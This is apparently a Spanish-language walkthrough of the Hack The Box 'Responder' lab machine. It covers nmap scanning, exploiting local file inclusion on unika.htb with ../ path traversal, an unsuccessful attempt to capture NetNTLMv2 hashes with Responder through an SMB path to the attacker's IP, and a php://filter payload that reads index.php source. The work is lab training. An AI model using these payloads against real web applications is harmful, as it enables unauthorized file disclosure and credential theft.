
![HTB-Responder](https://user-images.githubusercontent.com/103068924/162617408-a52c43fa-17f9-4b84-b875-2417a6381e7e.png)

# HTB-RESPONDER
Resolución de la starting_point de HTB Responder.

En primer lugar debemos asegurar que estamos conectados a la víctima y tratar de recopilar la máxima información posible.
 
## PING 

Para verificar la conexión y tener una primera toma de contacto utilizaremos el comando `ping`.
 
    ping [Ip Víctima]

Mediante este comando podemos obterner la siguiente información:
 
 - Verificar la conexión.
 - La latencia. Podemos observar el tiempo de recorrido de un paquete.  
 - Podemos optener la Ip de un dominio.
 - Determinar si estamos frente a un SO Linux o Windows:
     Windows ttl = 128
     Linux ttl = 64
     
![Captura de pantalla -2022-04-11 18-56-44](https://user-images.githubusercontent.com/103068924/162793073-6d60a6aa-c01b-4b66-b42b-f835402cd39d.png)

Como podemos ver tenemos conexión ya que nos devuelve los paquetes enviados y tambien podemos determinar que estamos frente a una máquina Windows, ya
que nos muestra un ttl=127.

## NMAP

Tras conocer la máquina a la que nos enfrentamos pasaremos analizar los protocolos tcp/udp.
  
Primero analizaremos lo puertos tcp ya que son los más utilizados y los más rápidos de escanear.
  
Mediante nmap realizaremos varios escaneos, el primero será un analisis de todos los puertos abiertos del protocolo tcp.

![Captura de pantalla -2022-04-11 18-58-03](https://user-images.githubusercontent.com/103068924/162793045-8827ee25-bc83-44b0-8bb9-1c35eded3f38.png)

    nmap -p- --open -T5 -v -n [Ip Víctima] -oG allPorts
  
 -p- : Escanea todo el rango de puertos.
  
 --open : Solo nos mostrará puertos con el estatus abierto.
  
 -T5 : Controla el tiempo y el rendimiento del escaneo donde 1 es el más lento  y 5 el más rápido.
        
 -v : Verbose. Recopila los puertos abiertos por TCP y los reporta por consola.
       
 -n : Anula la resolución DNS.
  
 -oG : Nos exporta los resultados en formato grepeable.
  
  allPorts : Es el archivo donde se guardan los resultados.
  
  Gracias a la función `extractPorts` podremos acceder en cualquier momento a los resultados guardados en el archivo `allPorts` y poder copiar y pegar
  de forma ráìda sin tener que volver a realizar el escaneo.
  
  Podreís encontrar la función 'extractPorts' en mi repositorio.
  
  Realizamos el escaneo con nmap:
   
![nmap2-HTB-REsponder](https://user-images.githubusercontent.com/103068924/162617839-1d17489e-72a4-4ecd-af53-da7447481361.png)

Podemos ver como nos muestra tres puertos abiertos. Tras conocer los puertos TCP abiertos, realizaremos un segundo escaneo enfocado solo en los puertos
abiertos para verla información que nos reportan y exportarlo en formato nmap al archivo `targed`.
 
 ![Captura de pantalla -2022-04-11 19-01-25](https://user-images.githubusercontent.com/103068924/162792939-c44ed297-d464-4c6c-bc52-c65dabaa83d0.png)

          nmap -sC -sV -p[Port1,Port2] [Ip Víctima] -oN target
   
 -sC : Lanza scrips básicos de reconocimiento.
 
 -sV : Localiza la versión y servicio de los puertos definidos.
       
 -p : Puertos a escanear.    Ej:  -p80,5985,7680
 
 -oN : Reporta los resultados en formato nmap al archivo 'target'.

![Captura de pantalla -2022-04-11 19-03-52](https://user-images.githubusercontent.com/103068924/162792891-3feca646-e0be-44fe-bbdc-e3efa5aa1865.png)

Ya tenemos un poco más de información, podemos ver como el puerto 80 tiene un servicio http.
Vamos a tratar de comprobar en el navegador si podemos acceder algún dominio mediante la ip
de la máquina.

Para ello nos dirigiremos al navegador (en mi caso firefox) y al tratarse de un sevicio http introduciremos la siguiente url:

    http://[Ip Víctima]
                                               
![Captura de pantalla -2022-04-11 19-20-45](https://user-images.githubusercontent.com/103068924/162795151-ad70832b-42d8-4e45-96ce-f0ce3dce181d.png)

![Captura de pantalla -2022-04-08 09-53-42](https://user-images.githubusercontent.com/103068924/162795451-2bbc001e-ea35-40a4-a27e-904c7cbce53d.png)

![Captura de pantalla -2022-04-08 09-54-10](https://user-images.githubusercontent.com/103068924/162796155-5962787f-1619-437a-bc8c-8c5b365ff4dc.png)

Como podemos ver, la dirección no nos carga, pero al fijarnos en la url vemos que nos redirige a una página llamada  'unika.htb'. Tener en cuenta que
firefox al no poder cargar la página en http automáticamente cambia a https para tambien tratar de cargar. Por eso que en firefox al tratar
de cargar la página finalmente nos muestra https pero la página a la que tenemos que acceder es:

    http://unika.htb

Al igual que en máquinas anteriores, vamos a tratar de introducir los datos del dominio en nuestra carpeta de hosts para ver si podemos cargar la paǵina.

Para ello nos dirigiremos al directorio '/etc/hosts' y introduciremos la Ip de la vítima y el host al que corresponde:

    sudo nano /etc/hosts
 
 ![Captura de pantalla -2022-04-11 19-39-18](https://user-images.githubusercontent.com/103068924/162798184-53e76dbb-ed24-4b98-9729-efc9b04efa3b.png)
 
Introducimos al final del archivola ip y el nombre del host (unika.htb) separados por un espacio.

![Captura de pantalla -2022-04-11 19-40-46](https://user-images.githubusercontent.com/103068924/162798145-483adee5-9d1d-4e36-8f7f-4abbe371e1e2.png)

Guardamos: Cntrl + o

Salimos: Cntrl + x

Una vez terminado esto, regresamos a nuestro navegador y tratamos de recargar la página `http://unika.htb`.

![Captura de pantalla -2022-04-08 10-20-23](https://user-images.githubusercontent.com/103068924/162798526-041b6223-048d-43d7-a4bf-3610c6f95e71.png)

Genial, ya tenemos acceso a la página. Como podemos ver, se trata de una empresa de diseño y estetica web.
Ahora vamos a tratar de revisar la página para buscar algo que nos pueda servir.

Despues de estar un rato revisando la página veo que la unica pestaña que parece hacer algo es la EN, que nos ofrece poder cambiar de idioma. 

![Captura de pantalla -2022-04-11 20-09-20](https://user-images.githubusercontent.com/103068924/162803508-7136d632-8a13-4123-98f1-47d6375ed705.png)

Al cambiar al frances (FR) o al alemán (DE), algo interesante es que la página cambia de url y nos redirige a una página html (más vulnerable). 

![Captura de pantalla -2022-04-11 20-15-17](https://user-images.githubusercontent.com/103068924/162803532-ac1ae87d-fcb3-4f96-aafc-ecc2a8c9306a.png)

Los sitios web dinámicos incluyen páginas HTML sobre la marcha utilizando información de la solicitud HTTP para incluir parámetros GET y POST, cookies
y otras variables. Es común que una página incluya otra página en función de algunos de estos parámetros.

Para tratar de acceder al sistema, vamos a utilizar una tecnica conocida como Local Fail Intrusion LFI.

## Local Fail Intrusion 

Un local fail intrusion (inclusión de archivos locales) ocurre cuando un atacante puede hacer que un sitio web incluya un archivo que posteriormente
utilizará en su beneficio.

Si la aplicación trata esta entrada como confiable y no se realizan las comprobaciones de seguridad requeridas en esta entrada, entonces el atacante
puede explotarla usando la cadena ../ en el nombre de la página ingresada y eventualmente ver los archivos confidenciales en el sistema de archivos
local.

La cadena `../` se usa para recorrer un directorio hacia atras, uno a la vez. Por lo tanto, se incluyen varias cadenas `../` en la URL para que el
controlador de archivos en el servidor vuelva al directorio base, es decir, `C:`.

Luego, cargaremos un archivo remoto en el host proporcionandole un nombre comun en windows para que el sistema no pueda detectarlo como malicioso.

Uno de los archivos más comunes a los que un probador de penetración podría intentar acceder en una máquina con Windows para verificar LFI es el
archivo de 'hosts'.
    
    WINDOWS/System32/drivers/etc/hosts
         
(Este archivo ayuda en la traducción local de nombres de host a direcciones IP). 

En nuestro caso vemos que al cambiar de idioma al frances (FR) se nos muestra una `page=` en la url. Aquí es donde mediante la cadena `../`
retrocederemos hasta el directorio inicial y luego nos dirigiremos al archivo `hosts`. Para ello introduciremos las siguientes ordenes en la url.

    http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
         
![Captura de pantalla -2022-04-11 21-38-44](https://user-images.githubusercontent.com/103068924/162816667-ebe0d677-98bc-43bf-8470-ad7a6f6383ad.png)

Como se puede ver, el Local File Inclusion es posible ya que podemos ver el contenido del archivo `host` en situado en el directorio
`C:/windows/system32/drivers/etc/hosts`.

![Captura de pantalla -2022-04-11 21-33-58](https://user-images.githubusercontent.com/103068924/162816016-aa5b7b18-5f76-497a-82f3-ea4a9cb5211e.png)

Esto es posible porque en el backend se usa el método 'include()' de PHP para añadir las URL de las página web de otros idiomas. Y debido a que no se
realiza una desinfección adecuada en este parámetro, pudimos pasar entradas maliciosas y ver los archivos internos del sistema.

## Include()

El metodo `include()` en php, toma todo el texto/código/marcado que existe en el archivo especificado y lo carga en la memoria, haciéndolo disponible
para su uso.

Sabemos que esta página web es vulnerable a la vulnerabilidad de inclusión de archivos y se sirve ben un máquina de ventanas. Por lo tanto, existe la
posibilidad de incluir un archivo en la estación de trabajo de nuestro atacante. 

Podemos utilizar un protocolo como SMB para que Windows intente autenticarse en nuestra máquina y poder capturar el `NetNTLMv2`.

## NTLM 

NTLM es una colección de protocolos de autenticación creados por Microsoft.

El proceso de autenticación NTLM se realiza de la siguiente manera: 

   1. El cliente envía el nombre de usuario y el nombre de dominio al servidor. 
   
   2. El servidor genera una cadena de caracteres aleatorios, denominada desafío y la devuelve al cliente. 
   
   3. El cliente cifra el desafío con el hash NTLM de la contraseña del usuario y lo envía de vuelta al servidor.
   
   4. El servidor recupera la contraseña de usuario (o equivalente).
    
   5. El servidor utiliza el valor hash recuperado de la base de datos de la cuenta de seguridad
      para cifrar la cadena de desafío. Luego, el valor se compara con el valor recibido del cliente.
      Si los valores coinciden, el cliente se autentica.
      
 En el archivo de configuración `php.ini` de la maquina, si `allow_url_include` está configurado en `Desactivado`
 de forma predeterminada indica que PHP no carga URL HTTP o FTP remotas para evitar ataques de inclusión
 de archivos remotos. 
 
 Sin embargo, incluso si allow_url_include y allow_url_fopen están configurados en `Off`, PHP no impedirá
 la carga de URL de SMB.
 
 En nuestro caso, podemos hacer un mal uso de esta funcionalidad para robar el hash NTLM.
 
 Ahora, podemos intentar cargar una URL de SMB y capturar los valores hash del objetivo mediante 'Responder'.
 
## Herramienta Responder
 
 Responder es una herramienta que puede realizar muchos tipos diferentes de ataques, pero para este escenario,
 configurará un servidor SMB malicioso.
 
 Cuando la máquina de destino intenta realizar la autenticación NTLM en ese servidor, Responder devuelve un 
 desafío para que el servidor cifre con la contraseña del usuario.
 
 Cuando el servidor responde, Responder utilizará el desafío y la respuesta cifrada para generar el NetNTLMv2.
 
 Si bien no podemos revertir NetNTLMv2, podemos probar muchas contraseñas comunes diferentes para ver si 
 alguna genera la misma respuesta de desafío y, si encontramos una, sabemos que esa es la contraseña.
 
 Esto a menudo se conoce como descifrado de hash, lo que haremos con un programa llamado `John The Ripper`.
 
 Primero nos clonaremos el repositorio de la herramienta Responder del siguiente repositorio:              
           
    sudo git clone https://github.com/SpiderLabs/Responder
            
![Captura de pantalla -2022-04-11 22-28-50](https://user-images.githubusercontent.com/103068924/162826505-7365e10f-5098-48a6-9442-97f614dfd888.png)
     
 Recordar que el repositorio `Responder` se clonara el directorio en el que nos encontremos. 
 Ahora podemos ver como dentro del directorio 'Responder' se han clonado los siguientes archivos:
 
 ![Captura de pantalla -2022-04-11 22-31-04](https://user-images.githubusercontent.com/103068924/162827046-93ba9dfa-fbe9-4396-bbaa-af556f168f95.png)

 Ahora vamosa a comprobar que en archivo 'Responder.conf' tenemos configurados los parametros de escucha
 SQL y SMB en On. Para ver el archivo podemos utilizar el comando 'cat' y para modificarlo el comando 'nano'.
 
    nano Responder.conf

 ![Captura de pantalla -2022-04-11 22-45-54](https://user-images.githubusercontent.com/103068924/162829073-13d21638-c3a8-4f37-a686-eec04a244055.png)

 En caso de estar en modo off lo cambiamos al on, guardamos (Cntrl + o) y salimos (Cntrl + x).
 
 Ya tendriamos la herramienta Responder preparada. Ahora debemos iniciar Responder con python3 y utilizar el indicado `-I` para activar el modo escucha.
 
    sudo python3 Responder.py -I tun0 
                
![Captura de pantalla -2022-04-11 22-58-20](https://user-images.githubusercontent.com/103068924/162831086-07194fd6-8afb-40a1-ad6f-1b65af7975be.png)

![Captura de pantalla -2022-04-11 22-59-03](https://user-images.githubusercontent.com/103068924/162831102-c08c5c76-bac8-4c54-821b-466124bfd0eb.png)

 Una vez tenemos el Responder listo y en escucha, debemos configurar un parámetro dentro del servidor de la máquina para que incluya un recurso de
 nuestro servidor SMB.
 
 Este parámetro lo configuraremos mediante el navegador web. Para ello incluiremos nuestra ip (tun0) lo cual podemos ver mediante el comando `ifconfig`.
 
    http://unika.htb/?page=//[Ip de nuestra tun0]/somefile
          
![Captura de pantalla -2022-04-12 00-04-50](https://user-images.githubusercontent.com/103068924/162841324-0250adad-5f7f-49ed-b487-81740e71a37a.png)

Tras intentar realizar la escucha varias veces y recargar la página no consdigo establecer la conexión.
He revisado varias veces la configuración y por algún motivo Responder no me funciona.

# File Local Inlcusion PHP

Así que tras ver que con Responder no podía, empece a buscar vulnerabilidades comunes de File Local Intrusion
y tras mucho investigar encontre una intrusión conocida como wrapper `php//filter`.

Donde básicamente mediante el buscador, incluimos una dirección que nos reporta el hash en base64.
Tras probar las distintas obciones, está fue la que me funciono a mi:

    page=php://filter/convert.base64-encode/resource=index.php

Aqui podeís encontrar más información y más vulnerabilidades de Local File Intrusion PHP:
[https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
         
![Captura de pantalla -2022-04-12 00-21-23](https://user-images.githubusercontent.com/103068924/162842965-294ea05b-12cf-4ec2-a433-38b95db263a9.png)
          
Lo introduciomos en el buscador:

![Captura de pantalla -2022-04-12 00-26-52](https://user-images.githubusercontent.com/103068924/162843528-2e662ba0-3eac-4d45-9d45-baf37a28d250.png)

    http://unika.htb/index.php?page=php://filter/convert.base64-encode/resource=index.php

Y al recargar la página podemos ver como se nos reporta un hash en base64. 

![Captura de pantalla -2022-04-12 00-35-10](https://user-images.githubusercontent.com/103068924/162844358-0814ecd9-5089-43f5-abdc-b0aa0a863e9c.png)

Lo copiaremos para poder pasarlo a una terminar y tratar de descifrarlo.



